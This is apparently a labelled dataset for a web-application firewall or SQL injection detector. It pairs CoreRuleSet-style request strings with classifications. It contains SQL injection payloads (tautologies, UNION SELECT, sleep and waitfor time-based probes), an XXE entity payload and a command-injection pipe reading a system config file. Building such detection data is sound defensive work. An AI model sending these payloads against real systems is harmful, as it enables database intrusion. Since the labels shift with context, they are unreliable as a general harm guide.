"string,classification"
"var=1234OR1=1,Malicious-Unsafe"
"var=-1839'or'1'='1,Malicious-Unsafe"
"var=-1839""or""1""=""2,Malicious-Unsafe"
"var=2010-01-01'+sleep(20.to_i)+',MaliciousIntended-but-safe"
"var=EmptyValue'and526=527,Malicious-Unsafe"
"var=foo')UNIONALLselectNULL--,MaliciousIntended-but-safe"
"var=foo')waitfor delay'5:0:20'--,MaliciousIntended-but-safe"
"var=JKGHUKGDI8TDHLFJH72FZLFJSKFH'andsleep(12)--,MaliciousIntended-but-safe"
"var=/path/to/file/unitests.txt')UNIONALLselectNULL--,MaliciousIntended-but-safe"
"1'||(selectextractvalue(xmltype('<?xmlversion=""1.1""encoding=""UTF-8""?><!DOCTYPEroot[<!ENTITY%toyopSYSTEM""https://coreruleset.org/"">%toyop;,MaliciousIntended-but-safe"
"var=sleep(20),Safe"
"var=unittests@coreruleset.org""sleep(10.to_i)"",Safe"
"var=""|type%SystemDrive%\\config.ini|"",Safe"
"var=""unittests@coreruleset.org""'))and(select*from(select(sleep(5)))x)--,MaliciousIntended-but-safe"
"/1234 OR 1=1,Safe"
"/2010-01-01'+sleep(20.to_i)+',Safe"
"/EmptyValue' and 526=527,Safe"
"/foo')waitfor delay'5:0:20'--,Safe"
"/sleep(20),Safe"
"/unittests@coreruleset.org"" sleep(10.to_i) "",Safe"
"/foo/24'union+all+select+1,2,3+from+aa,MaliciousIntended-but-safe"
"/foo/24'union+all+select+1,2,3+from+aa/bar,MaliciousIntended-but-safe"
"/*/*/2+union+all/bar,MaliciousIntended-but-safe"
"/foo/9'union+all/bar,MaliciousIntended-but-safe"
"/foo/24+union+all+select+1,2,3+from+aa/bar,Safe"
"/?var=blahblah&var2=LIKE NULL,Safe"
"pay=RegExp,Safe"
">>,Safe"
"pay=&&,Safe"
"<<,Safe"
"!=,Safe"
"||,Safe"
"XOR,Safe"
"pay=<=,Safe"
"ISNULL,Safe"
"in(0,1),Safe"
"in(2147483647,-1),Safe"
"pay=<=>,Safe"
"regexp,Safe"
"RLIKE,Safe"
"<>,Safe"
"+in+(++select+anfrage_id+from+erkenntnisse+where+id+is++not++null++),MaliciousIntended-but-safe"
"+IN+(815914,+815913),Safe"
"+IN+(815919,+815920,+815921,+815922,+815923,+815924,+815925,+815926,+815927,+815928,+815929,+815930,+815932,+815933,+815934,+815935,+815936,+815937,+815917,+815918),Safe"
"pay=in(Aa,-Ab-,andAc),Safe"
">=,Safe"
